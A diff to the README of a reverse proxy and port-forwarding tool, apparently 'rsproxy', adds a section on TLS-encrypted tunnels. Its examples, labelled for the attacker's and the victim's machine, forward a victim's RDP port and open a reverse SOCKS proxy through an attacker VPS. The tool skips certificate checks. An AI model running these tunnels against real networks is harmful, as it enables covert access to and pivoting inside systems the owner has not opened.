@@ -165,6 +165,38 @@ Reverse socks proxy.
 # now attacker can use socks proxy on vps:8888
 ```
 
+### TLS Encryption
+
+TLS encryption is supported for TCP, Unix domain socket forwarding and socks proxy.
+
+To enable encryption, simple add `+` sign in front of the address or port.
+
+For ease of use, the server uses a self-signed TLS certificate by default, and the client trusts all certificates (no verify).
+
+Example of a TLS encrypted TCP port forwarding.
+
+```bash
+# on attacker's machine
+./rsproxy fwd -l +7777 -l 33890
+
+# on victim's machine
+./rsproxy fwd -r 127.0.0.1:3389 -r +vps:7777
+
+# now attacker can access 3389 through vps:33890, and the traffic on port 7777 will be encrypted
+```
+
+Example of a TLS encrypted reverse socks proxy.
+
+```bash
+# on attacker's machine
+./rsproxy socks -l +7777 -l 8888
+
+# on victim's machine
+./rsproxy socks -r +vps:7777
+
+# now attacker can use socks proxy on vps:8888, and the traffic on port 7777 will be encrypted
+```
+
 ## Reference
 
 [https://github.com/EddieIvan01/iox](https://github.com/EddieIvan01/iox)
